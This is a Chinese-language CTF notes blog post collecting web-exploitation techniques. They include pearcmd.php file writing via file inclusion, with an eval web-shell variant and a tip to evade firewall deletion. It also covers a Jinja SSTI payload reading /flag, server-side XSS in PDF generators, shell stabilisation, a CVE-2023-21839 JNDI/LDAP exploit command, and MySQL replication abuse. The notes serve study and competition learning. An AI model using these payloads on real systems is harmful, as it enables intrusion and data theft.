<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>笔记 | Ttoc's blog</title><meta name="author" content="Ttoc"><meta name="copyright" content="Ttoc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="关键笔记，主要总结比赛中遇到的">
<meta property="og:type" content="article">
<meta property="og:title" content="笔记">
<meta property="og:url" content="https://ttoc.fun/2023/02/15/Notes/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="关键笔记，主要总结比赛中遇到的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ttoc.fun/img/21.jpg">
<meta property="article:published_time" content="2023-02-15T09:34:06.818Z">
<meta property="article:modified_time" content="2023-09-08T09:42:06.956Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="daily">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.fun/img/21.jpg"><link rel="shortcut icon" href="/img/website.png"><link rel="canonical" href="https://ttoc.fun/2023/02/15/Notes/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":20,"languages":{"author":"Author: Ttoc","link":"Link: ","source":"Source: Ttoc's blog","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2023-09-08 17:42:06'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/progress_bar.css"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 5.4.2"><style>.darkmode--activated{--body-bg-color:#494444;--content-bg-color:#524d4d;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#423f3f;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#3b3d3f;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#4d5155;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-vs.css" type="text/css"></head><body><link rel="stylesheet" href="/css/barber-shop.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background:url(/img/21.jpg);background-attachment: local;background-position: center;background-size: cover;background-repeat: no-repeat;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/21.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ttoc's blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> Archives</span></a></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-02-15T09:34:06.818Z" title="Created 2023-02-15 17:34:06">2023-02-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-09-08T09:42:06.956Z" title="Updated 2023-09-08 17:42:06">2023-09-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">7.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>27min</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><code>关键笔记，主要总结比赛中遇到的</code></p>
<span id="more"></span>

<h1 id="pearcmd-php的巧妙利用"><a href="#pearcmd-php的巧妙利用" class="headerlink" title="pearcmd.php的巧妙利用"></a><code>pearcmd.php</code>的巧妙利用</h1><blockquote>
<p>来自P神博客</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
</blockquote>
<p>就是利用<code>pearcmd.php</code>这个<code>pecl/pear</code>中的文件。</p>
<p><code>pecl</code>是<code>PHP</code>中用于管理扩展而使用的命令行工具，而<code>pear</code>是<code>pecl</code>依赖的类库。在<code>7.3</code>及以前，<code>pecl/pear</code>是默认安装的；在<code>7.4</code>及以后，需要我们在编译<code>PHP</code>的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在<code>Docker</code>任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<blockquote>
<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+<span class="regexp">/&amp;file=/u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd.php&amp;<span class="regexp">/&lt;?=phpinfo()?&gt;+/</span>tmp/hello.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>#config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p>
</blockquote>
<p>发送数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code></p>
<blockquote>
<p><code>/tmp/hello.php</code><br>当然也可以改成<code>/var/html/www</code>，这样就可以直接读取，不用利用文件包含参数进行对<code>/tmp/hello.php</code>读取</p>
<p>只是放在<code>/tmp</code>下不容易触发防火墙被删除</p>
</blockquote>
<p>利用文件包含存在，再包含这个文件，就会显示我们的信息</p>
<blockquote>
<p><code>&lt;?=phpinfo()?&gt;</code><br>也可以改写成<br><code>&lt;?=eval($_POST[8]);&gt;</code><br>这样就可以执行更多的命令了</p>
</blockquote>
<h1 id="libmbfl打分"><a href="#libmbfl打分" class="headerlink" title="libmbfl打分"></a>libmbfl打分</h1><blockquote>
<p>所以实现<code>$charset == BASE64</code>，只要文件内容前面数据让它识别为base64即可</p>
<p>那么如何让其认为是base64呢？</p>
<p>这就涉及到<code>libmbfl</code>的打分，<code>libmbfl</code>是<code>mb</code>扩展</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>我的理解就是类似像<code>checkengine</code>，比如<code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p>
</blockquote>
<p>这是打分判断</p>
<blockquote>
<p>0xFFFF是-1，&gt;&#x3D;0 </p>
<blockquote>
<p>0x21是33 33对应!</p>
<p>0x2F是47 47对应&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>打分打的多</p>
</blockquote>
<h1 id="Tomcat以-一种奇怪的方式进行规范化"><a href="#Tomcat以-一种奇怪的方式进行规范化" class="headerlink" title="Tomcat以;一种奇怪的方式进行规范化"></a>Tomcat以;一种奇怪的方式进行规范化</h1><blockquote>
<p><code>;</code>后的数据不解析</p>
<p>即可<code>http://127.0.0.1/index;123.ico</code>，读取时只视为<code>http://127.0.0.1/index</code></p>
</blockquote>
<h1 id="服务器端XSS【针对于动态PDF】"><a href="#服务器端XSS【针对于动态PDF】" class="headerlink" title="服务器端XSS【针对于动态PDF】"></a>服务器端XSS【针对于动态PDF】</h1><blockquote>
<p><code>https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdfhttps://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</code></p>
</blockquote>
<p>还是从htb的机器学习到的</p>
<blockquote>
<p>比如，在一些购物网站订单会自动生成一个动态的pdf方便打印作为报销的凭证，</p>
<p>但是虽然看起像是pdf，但本质还是html网站。才可以实现动态，而其中的数据也是客户端传向服务器生成</p>
<p>那么如果传向服务器进行动态pdf生成的数据被用户控制，导致最后生成的pdf中的数据返回一些服务器的敏感的数据，就会非常危险</p>
</blockquote>
<blockquote>
<p>如果网页使用用户控制的输入创建 PDF，您可以尝试诱骗创建 PDF 的机器人执行任意 JS 代码。 因此，如果 PDF 创建者机器人找到某种 HTML 标记，它将解释它们，您可以滥用此行为<code>导致服务器 XSS</code>。</p>
</blockquote>
<p>请注意，<code>&lt;script&gt;&lt;/script&gt;</code> 标签并不总是有效，因此您需要不同的方法来执行 JS（例如，滥用 <code>&lt;img</code>,<code>&lt;iframe&gt;</code>）。 </p>
<p>另外，请注意，在常规利用中，您将能够<strong>查看&#x2F;下载创建的pdf</strong>，因此您将能够看到<code>通过JS编写的所有内容</code>（例如使用<code>document.write（）</code>）。</p>
<p>但是，如果您<strong>看不到</strong>创建的PDF，则可能需要<strong>提取信息，从而向您发出Web请求</strong>（盲写，然后看回显猜测）。</p>
<h1 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="获得稳定的shell"></a>获得稳定的shell</h1><p>【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】</p>
<blockquote>
<ol>
<li><p><strong>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong> 或者</p>
<p>**python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’**进入交互式shell</p>
</li>
<li><p><code>Ctrl-Z</code>将shell放到后台</p>
</li>
<li><p><code>stty raw -echo ; fg ; reset</code></p>
</li>
</ol>
<p>&#x2F;&#x2F;stty 设置终端端口设备的接口选项</p>
<p>&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls</p>
<p>&#x2F;&#x2F;fg把shell提到前台来</p>
<p>&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断</p>
</blockquote>
<p><img src="/2023/02/15/Notes/image-20221002145951718.png" alt="image-20221002145951718"></p>
<p>成功获得全交互式<code>shell</code></p>
<h1 id="T3协议的反序列化攻击"><a href="#T3协议的反序列化攻击" class="headerlink" title="T3协议的反序列化攻击"></a>T3协议的反序列化攻击</h1><p>这是在复现CVE-2023-21839时，查看其利用的基本原理T3&#x2F;时看到的</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/unicodeSec/p/14378757.html">学习文章</a></p>
<h1 id="记第一次公网测试"><a href="#记第一次公网测试" class="headerlink" title="记第一次公网测试"></a>记第一次公网测试</h1><p>比如，在复现cve-2023-21839时</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./web.exe -<span class="built_in">ip</span> 公网<span class="built_in">ip</span> -port <span class="number">7001</span> -ldap ldap:<span class="comment">//另一个公网ip（挂者jndi）:1389/xx</span></span><br></pre></td></tr></table></figure>

<p>如果想在本机进行复现，需要让自己的ip变成可以被公网访问的ip，在上面进行打开ldap，以及挂上恶意类，否则只能本地测试</p>
<h1 id="file-b解析-后内容显示"><a href="#file-b解析-后内容显示" class="headerlink" title="file -b解析#!后内容显示"></a>file -b解析#!后内容显示</h1><p>这里就需要一个知识点<code>#!</code>后的内容，会被视为文件的解释器，然后打印出来，比如</p>
<p><img src="/2023/02/15/Notes/image-20230312224705119.png" alt="image-20230312224705119"></p>
<p>这里</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">a </span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> script, ASCII text executable</span></span><br></pre></td></tr></table></figure>

<p>就看出来它把文本</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>当作了<code>script</code>解析器，在解析文件类型时，就把它打印出来了</p>
<p>于是我们上传该文件</p>
<p><img src="/2023/02/15/Notes/image-20230312224941575.png" alt="image-20230312224941575"></p>
<p>得到flag</p>
<h1 id="strace命令"><a href="#strace命令" class="headerlink" title="strace命令"></a>strace命令</h1><p>在Linux系统中，strace命令是一个集诊断、调试、统计与一体的工具，可用来追踪调试程序，能够与其他命令搭配使用。</p>
<p>在Linux世界，<code>进程不能直接访问硬件设备</code>，当进程需要访问硬件设备 (比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。<code>strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</code></p>
<p>而对于一些命令而言也可以监控其调用的一些文件信息</p>
<p>比如</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strace <span class="regexp">/bin/</span><span class="keyword">file</span></span><br><span class="line">#查询<span class="keyword">file</span>命令执行需要调用的文件信息</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/15/Notes/image-20230330210854308.png" alt="image-20230330210854308"></p>
<p>可以看到调用了一个<code>/etc/ld.so.preload</code>文件</p>
<p><img src="/2023/02/15/Notes/image-20230330211853378.png" alt="image-20230330211853378"></p>
<h1 id="Mysql主从复制"><a href="#Mysql主从复制" class="headerlink" title="Mysql主从复制"></a>Mysql主从复制</h1><blockquote>
<p>主从复制的基础是主服务器对数据库修改记录二进制日志，从服务器通过主服务器的二进制日志自动执行更新，也就是主库只传日志给从库，从库根据日志执行命</p>
<p>[学习文章]</p>
<p>作者：小熊我不要了<br>链接：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903921677238285">https://juejin.cn/post/6844903921677238285</a></p>
</blockquote>
<p>在某比赛遇到的，一个<code>sql</code>注入环境，对语句过滤很多，也包括<code>select、updatexml</code>等等常用的语句。</p>
<p>但是没有过滤<code>show，slave，change</code>等语句</p>
<hr>
<p>该题需要一个登录，是在一个php语句中</p>
<p>大概是从ctf库中，查询其中的admin表，匹配其中用户名和密码</p>
<p>但是ctf库，利用<code>show tables in ctf;</code>发现是一个空库，连表也没有，也就是直接登录改根本不行，需要修改它的数据库，添加用户信息</p>
<p><code>show variables like &#39;secure_file_priv&#39;;</code>查看其有没有可以被读取或写入的文件，也是空</p>
<hr>
<p>所以根据主从复制的思路就是，攻击机搭建一个数据库作为主库，而环境的数据库当作从库，从而实现在攻击上进行修改使得从库【环境数据库】被修改</p>
<p>为什么会想到利用主从复制，其实很简单，过滤了这么多，但是执行</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">show</span> slave <span class="built_in">status</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到回显，并且显示Running</p>
<blockquote>
<p><strong>主从配置</strong></p>
<p>在主从配置之前需要确保两台mysql需要同步的库状态一致。</p>
</blockquote>
<h2 id="攻击机【主】"><a href="#攻击机【主】" class="headerlink" title="攻击机【主】"></a>攻击机【主】</h2><p>配置文件默认在<code>/etc/my.cnf</code>下。</p>
<p>在配置文件中新增配置：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment">## 同一局域网内注意要唯一</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">100</span>  </span><br><span class="line"><span class="comment">## 开启二进制日志功能，可以随便取（关键）</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-bin</span><br></pre></td></tr></table></figure>

<p>修改配置后需要重启才能生效：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">service mysql restart</span></span><br></pre></td></tr></table></figure>

<p>重启之后进入mysql：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>在<code>master</code>数据库创建数据同步用户，授予用户 slave REPLICATION SLAVE权限和REPLICATION CLIENT权限，用于在主从库之间同步数据。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;@#$Rfg345634523rft4fa&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">REPLICATION</span> SLAVE, <span class="keyword">REPLICATION</span> CLIENT <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>语句中的<code>%</code>代表所有服务器都可以使用这个用户，如果想指定特定的ip，将<code>%</code>改成ip即可。</p>
<p>查看主mysql的状态：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">master</span> <span class="title">status</span>;</span><br></pre></td></tr></table></figure>

<p>记录下<code>File</code>和<code>Position</code>的值，并且不进行其他操作以免引起<code>Position</code>的变化。</p>
<p><img src="/2023/02/15/Notes/image-20230330224610135.png" alt="image-20230330224610135"></p>
<blockquote>
<p><code>File</code>：这是 MySQL 服务器正在写入的当前二进制日志文件的名称。</p>
<p><code>Position</code>：这是下一个事件将被写入的二进制日志文件中的位置。</p>
</blockquote>
<h3 id="环境执行【从】"><a href="#环境执行【从】" class="headerlink" title="环境执行【从】"></a>环境执行【从】</h3><p>配置环境已经有了，所以不用考虑如何修改</p>
<blockquote>
<p>在从<code>my.cnf</code>配置中新增：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysqld]</span><br><span class="line"><span class="comment">## 设置server_id,注意要唯一</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">101</span>  </span><br><span class="line"><span class="comment">## 开启二进制日志功能，以备Slave作为其它Slave的Master时使用</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-slave-bin   </span><br><span class="line"><span class="comment">## relay_log配置中继日志</span></span><br><span class="line"><span class="attr">relay_log</span>=edu-mysql-relay-bin  </span><br></pre></td></tr></table></figure>

<p>修改配置后需要重启才能生效：</p>
</blockquote>
<p>修改主库信息，将主库信息改成攻击机，用户名和密码都是主机之前建立的</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change master <span class="keyword">to</span> <span class="attribute">master_host</span>=<span class="string">&#x27;攻击机ip&#x27;</span>, <span class="attribute">master_user</span>=<span class="string">&#x27;slave&#x27;</span>, <span class="attribute">master_password</span>=<span class="string">&#x27;@#$Rfg345634523rft4fa&#x27;</span>, <span class="attribute">master_port</span>=3306, <span class="attribute">master_log_file</span>=<span class="string">&#x27;mysql-bin.000064&#x27;</span>, master_log_pos= 12, <span class="attribute">master_connect_retry</span>=30;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>*注：日志的postion和file要修改成自己的攻击机对应的，指定从库从哪个文件进行读取，从哪个位置进行读取</p>
</blockquote>
<p>修改后，执行</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">start</span> <span class="literal">slave</span>;</span><br><span class="line"><span class="comment">#开启主从复制</span></span><br></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show <span class="literal">slave</span> status;</span><br><span class="line"><span class="comment">#查看同步状态</span></span><br></pre></td></tr></table></figure>

<p>得到<code>SlaveIORunning</code> 和 <code>SlaveSQLRunning</code> 都是Yes说明主从复制已经开启</p>
<p>然后就按之前得到信息，在主库建立ctf库，然后建立admin表，在里面添加user和password的数据、</p>
<p>最后等环境数据库【从库】与攻击机数据库同步后，即可进行成功登录拿到flag</p>
<blockquote>
<p>P.S</p>
<p>由于mysql8新增密码规则<code>caching_sha2_password</code>，要求密码必须有一定复杂度，必须有字母大小写、数字和特殊符号，所以可能有时密码通不过，可以尝试修改密码规则为<code>mysql_native_password</code>以实现可以用简易密码</p>
</blockquote>
<h1 id="windows与linux对-的不同解析与限制"><a href="#windows与linux对-的不同解析与限制" class="headerlink" title="windows与linux对;的不同解析与限制"></a>windows与linux对;的不同解析与限制</h1><p>在windows中，你可以将文件名名为类似</p>
<blockquote>
<p>1;hahahaha;.txt</p>
</blockquote>
<p><img src="/2023/02/15/Notes/image-20230501222412594.png" alt="image-20230501222412594"></p>
<p>而在linux中则不行，因为它会将其解析成三段命令</p>
<blockquote>
<p>1 hahahaha .txt</p>
</blockquote>
<p>如果想要命名，则需要单引号包裹</p>
<p><img src="/2023/02/15/Notes/image-20230501222722767.png" alt="image-20230501222722767"></p>
<blockquote>
